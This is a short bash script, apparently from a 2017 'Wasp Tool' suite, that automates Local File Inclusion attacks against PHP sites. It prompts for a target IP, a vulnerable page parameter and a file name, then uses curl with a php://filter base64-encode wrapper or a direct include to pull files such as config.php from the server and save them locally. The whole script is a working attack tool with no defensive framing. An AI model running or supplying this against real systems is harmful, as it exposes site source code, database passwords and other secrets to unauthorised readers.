#!/bin/bash
echo
cat << "EOF"

                 _     _____ ___         _   _             _    
                | |   |  ___|_ _|   __ _| |_| |_ __ _  ___| | __
                | |   | |_   | |   / _` | __| __/ _` |/ __| |/ /
                | |___|  _|  | |  | (_| | |_| || (_| | (__|   < 
                |_____|_|   |___|  \__,_|\__|\__\__,_|\___|_|\_\
                                                                


EOF
echo
echo -e "\e[1;31m:::::::Wasp Tool v.1 2017:::::::.\e[0m"
echo -e "\e[1;92m:::::::LFI Attack :::::::.\e[0m"
echo -e "\e[1;32mPlease enter Target IP:\e[0m"
read ip
echo
echo
echo -e "\e[1;31m1. $ip.\e[0m"
echo -e "\e[1;32mPlease enter Exploit page:\e[0m"
echo "Example: /index.php?page"
read page
echo -e "\e[1;31m1. $ip/$page.\e[0m"
echo -e "\e[1;32mshow files:\e[0m"
echo "Example: config.php"
read evil
echo -e "\e[1;32msave file:\e[0m"
read save
while : 
do
echo -e "\e[1;32m[1]. filter base64.\e[0m"
echo -e "\e[1;32m[2]. source attack.\e[0m"
echo -e "\e[1;32m[3]. restart.\e[0m"
echo -e "\e[1;32m[4]. back.\e[0m"
echo -e "\e[1;32m[4]. Exit.\e[0m"
echo -e "\e[1;32m1. Choice.\e[0m"
read -n1 -s

echo $choice
case "$REPLY" in
     1) curl $ip/$page=php://filter/convert.base64-encode/resource=$evil > /usr/share/wasp/report/$save.txt ;;
     2) curl $ip/$page=$evil > /usr/share/wasp/report/$save.txt ;;
     3) /usr/share/wasp/curlwsp.sh ;;
     4) wasp ;;
     5) exit ;;
     *) echo; echo "Invalid choice."; echo
esac
sleep 1
done
